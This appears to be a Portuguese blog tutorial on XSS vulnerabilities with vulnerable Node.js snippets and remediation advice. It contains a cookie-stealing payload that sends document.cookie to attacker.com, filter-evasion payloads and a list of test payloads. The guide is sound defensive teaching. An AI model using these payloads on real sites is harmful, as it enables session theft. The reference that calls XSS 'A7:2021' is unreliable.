---
title: "Análise de Vulnerabilidade XSS em Aplicações Web"
description: "Um guia técnico sobre como identificar, explorar e remediar vulnerabilidades de Cross-Site Scripting em aplicações web modernas."
pubDate: 2026-09-29
tags:
  - Security
  - AppSec
  - Web
  - Vulnerabilidade
---

## Introdução

Cross-Site Scripting (XSS) permanece uma das vulnerabilidades mais prevalentes em aplicações web segundo relatórios do OWASP. Neste artigo, realizamos uma análise técnica detalhada de como essas vulnerabilidades funcionam, seus impactos e as melhores práticas de remedição.

## Tipos de XSS

### Reflected XSS

O XSS Refletido ocorre quando dados não sanitizados fornecidos pelo usuário são imediatamente exibidos na resposta HTTP sem validação apropriada.

```javascript
// Código vulnerável
app.get('/search', (req, res) => {
    const query = req.query.q;
    res.send(`<h1>Resultados para: ${query}</h1>`);
});
```

Um atacante poderia enviar:
```
https://site.com/search?q=<img src=x onerror="fetch('//attacker.com/steal?data='+document.cookie)">
```

### Stored XSS

O XSS Armazenado é mais perigoso pois o payload é persistido no banco de dados.

```javascript
// Código vulnerável
app.post('/comment', (req, res) => {
    db.comments.insert({
        author: req.body.author,
        text: req.body.text  // Sem sanitização!
    });
});
```

Quando o comentário é exibido:
```html
<div class="comment">
    <strong>{{ comment.author }}</strong>
    <p>{{ comment.text }}</p>
</div>
```

### DOM-based XSS

Exploração ocorre completamente no lado do cliente através de manipulação do DOM.

```javascript
// Código vulnerável
document.getElementById('target').innerHTML = window.location.hash.substring(1);
```

URL: `http://site.com/#<img src=x onerror="alert('XSS')">`

## Técnicas de Exploração Avançadas

### Evasão de Filtros

```javascript
// Alguns filtros podem ser contornados com:
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
// Codificação Base64 de: alert(1)

<img src=x onerror="alert(String.fromCharCode(88,83,83))">
// Uso de char codes

<svg onload="alert('XSS')">
// Alternativa ao img tag
```

### Bypass de CSP (Content Security Policy)

```html
<!-- Vulnerable CSP -->
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">

<!-- Script tags diretos funcionam -->
<script>alert('XSS')</script>
```

## Remediação

### 1. Output Encoding

```javascript
// Usando biblioteca como DOMPurify
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);
document.getElementById('target').innerHTML = clean;

// Ou com encoding manual
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}
```

### 2. Content Security Policy

```html
<!-- Strict CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted.com; style-src 'self'">
```

### 3. Input Validation

```javascript
// Validar entrada
const validator = require('validator');

if (!validator.isLength(userInput, { min: 1, max: 500 })) {
    throw new Error('Input inválido');
}

if (!validator.matches(userInput, /^[a-zA-Z0-9\s.,!?-]+$/)) {
    throw new Error('Caracteres não permitidos');
}
```

### 4. Usar Frameworks Seguros

```typescript
// React - sempre escapa por padrão
<div>{userInput}</div>

// Ao invés de innerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Vue com v-text
<div v-text="userInput"></div>
```

## Testes e Validação

### Checklist de Segurança

- [ ] Todos os inputs de usuário são escapados no output?
- [ ] CSP está configurado e é suficientemente restritivo?
- [ ] Framework escapa HTML por padrão?
- [ ] Testes incluem payloads XSS comuns?
- [ ] WAF está configurado para detectar padrões XSS?

### Payloads para Testes (Responsável)

```javascript
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
"><script>alert(String.fromCharCode(88,83,83))</script>
<body onload=alert('XSS')>
```

## Conclusão

XSS continua sendo uma ameaça significativa em aplicações web. A defesa em profundidade combinando validação de entrada, output encoding, CSP e uso de frameworks seguros é essencial para uma aplicação segura.

### Referências

- OWASP Top 10 - A7:2021 Cross-Site Scripting (XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation
- MDN: Cross-Site Scripting (XSS)
